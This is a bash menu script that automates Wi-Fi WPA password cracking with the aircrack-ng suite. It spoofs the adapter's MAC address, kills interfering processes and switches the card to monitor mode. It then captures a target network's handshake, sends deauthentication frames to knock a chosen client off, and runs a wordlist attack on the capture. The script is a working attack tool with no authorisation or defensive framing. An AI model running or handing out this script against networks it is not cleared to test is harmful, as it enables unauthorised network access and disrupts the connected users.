#!/bin/bash

 LG='\033[1;32m' #light green
 NC='\033[0m' #no color


 
 switch=""

 printf "\n ${LG}Do the steps in different tabs${NC}\n\n"

 printf "\n ${LG}1. Enable Monitoring${NC}\n"
 printf "\n ${LG}2. Monitor Network${NC}\n"
 printf "\n ${LG}3. Force Reconnect and capture Handshake${NC}\n"
 printf "\n ${LG}4. Crack Password${NC}\n"
 printf "\n ${LG}5. Restart Network${NC}\n"
 printf "\n ${LG}6. Exit${NC}\n"
 printf "\n"
 read -p "Select an option: " switch
 case "$switch" in


 "1")
	 printf "\n ${LG}Keep this terminal until password is cracked. ${NC}\n\n\n"
	 sleep 2
	 ifconfig
 
	 i=20
	 while [ $i != 0 ]
	 do
	 printf "${LG}..${NC}" 
	 sleep 0.03
	 i=`expr $i - 1`
	 done
	
	 printf "\n"
	 #Reading devicename
	 devname="USER INPUT"
	 read -p "Enter devicename: " devname
	 mdevname=$devname"mon" 

	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 	
		sleep 0.08
 		i=`expr $i - 1`
	 done
	 
	 printf  "\n ${LG}Changing MAC${NC} \n"
	 ifconfig $devname down
	 sleep 1
	 macchanger -r $devname
	 sleep 1
	 ifconfig $devname up
	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.19
	 	i=`expr $i - 1`
	 done

	 printf "\n ${LG}process killing${NC} \n"
	 airmon-ng check kill
	
	 
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.4
	 	i=`expr $i - 1`
	 done
	
	
	 printf " \n ${LG}Starting $devname monitor${NC} \n"
	 airmon-ng start $devname
		 
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.4
	 	i=`expr $i - 1`
	 done
	
	
	 printf "\n ${LG}Dumping${NC} \n"
	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.1
	 	i=`expr $i - 1`
	 done
	 printf "\n"
	 airodump-ng $mdevname
	
 ;;


 "2")

 	 printf "\n${LG}Close this terminal only after capturing handshake.${NC}\n\n"
	 sleep 1
	 BSSID=""
	 read -p "Enter BSSID: " BSSID
	 printf "\n"
	 channel=""
	 read -p "Enter Channel no: " channel
	 printf "\n"
	 ifconfig
	 printf "\n"
	 devname=""
	 read -p "Enter devicename: " devname
	 airodump-ng -c $channel --bssid $BSSID -w /root/Desktop/ $devname

 ;;

 "3")
	 BSSID=""
	 read -p "Enter BSSID: " BSSID
	 printf "\n"
	 station=""
	 read -p "Enter Station No: " station
	 printf "\n"
	 ifconfig
	 printf "\n"
	 devname=""
	 read -p "Enter devicename: " devname
	 aireplay-ng -0 2 -a $BSSID -c $station $devname

 ;;

 "4")
	printf "\n${LG}Syntax: \naircrack-ng -a2 -b 04:1E:64:98:96:AB -w /usr/share/wordlists/fern-wifi/common.txt /root/Desktop/-01.cap${NC}\n\n"
	BSSID=""
	read -p "Enter BSSID: " BSSID
	printf "\n"
	printf "\n${LG}Example: /usr/share/wordlists/fern-wifi/common.txt ${NC}\n\n"
	path=""
	read -p "Enter Path to wordlist: " path
	printf "\n"
	printf "\n${LG}Example: /root/Desktop/*.cap ${NC}\n\n"
	pathcab=""
	read -p "Enter Path of your .cab file: " pathcab
	printf "\n"
	aircrack-ng -a2 -b $BSSID -w $path $pathcab

 ;;


 "5")
	 ifconfig
 
	 i=20
	 while [ $i != 0 ]
	 do
	 printf "${LG}..${NC}" 
	 sleep 0.03
	 i=`expr $i - 1`
	 done
	
	 printf "\n\n"
	 #Reading devicename
	 devname="USER INPUT"
	 read -p "Enter devicename: " devname
	 

	printf "\n ${LG}network-manager restarting${NC}\n"

	service network-manager restart

	airmon-ng stop "$devname"
	
	sleep 1

	echo  -e "\n ${LG}Monitoring stop${NC}\n"

	echo -e "\n ${LG}Done${NC}\n"

 ;;





 "6")
	exit 1
	;;
 *)
	printf "\n ${LG}Incorrect option${NC}\n"
	;;

esac
